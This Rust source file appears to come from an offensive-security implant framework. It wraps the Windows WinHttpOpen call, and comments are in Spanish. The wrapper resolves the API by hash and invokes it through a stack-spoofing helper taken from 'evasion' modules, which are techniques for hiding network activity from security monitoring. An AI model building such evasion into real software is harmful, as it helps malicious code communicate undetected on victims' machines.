use crate::nt::types::*;
use crate::techniques::evasion::dinamic_api_resolution::get_winhttp_base;
use crate::techniques::evasion::execution::user_mode_call::user_mode_call_with_spoof;

// https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopen


#[allow(dead_code)]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u32)]
pub enum WinHttpAccessType {
    DefaultProxy = 0,
    NoProxy = 1,
    NamedProxy = 3,
    AutomaticProxy = 4,
}

pub const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY: DWORD = 0;
pub const WINHTTP_ACCESS_TYPE_NO_PROXY: DWORD = 1;
pub const WINHTTP_ACCESS_TYPE_NAMED_PROXY: DWORD = 3;
pub const WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY: DWORD = 4;

// Flags opcionales para WinHttpOpen (`dwFlags`)
pub const WINHTTP_FLAG_ASYNC: DWORD = 0x10000000;
pub const WINHTTP_NO_PROXY_NAME: LPCWSTR = std::ptr::null();
pub const WINHTTP_NO_PROXY_BYPASS: LPCWSTR = std::ptr::null();

// Inicializa una sesión HTTP de WinHTTP
pub fn win_http_open(
    psz_agent_w: LPCWSTR,            // in_opt - nombre user agent
    dw_access_type: DWORD,           // in - tipo acceso proxy
    psz_proxy_w: LPCWSTR,            // in_opt - servidor proxy especificado
    psz_proxy_bypass_w: LPCWSTR,     // in_opt - lista omisión proxy
    dw_flags: DWORD,                 // in - flags adicionales sesión
) -> Result<HINTERNET, String> { // ret - handle sesión o error
    let api_hash = 0x8af2f4a8; // unique_hash("WinHttpOpen")
    let winhttp_base = unsafe { get_winhttp_base().map_err(|e| e.to_string())? };

    let handle = user_mode_call_with_spoof(
        winhttp_base,
        api_hash,
        psz_agent_w as usize,
        dw_access_type as usize,
        psz_proxy_w as usize,
        psz_proxy_bypass_w as usize,
        dw_flags as usize,
        0,
        0,
        0,
    )?;

    if handle == 0 {
        Err(String::from("WinHttpOpen retornó NULL (error al abrir la sesión WinHTTP)"))
    } else {
        Ok(handle as HINTERNET)
    }
}
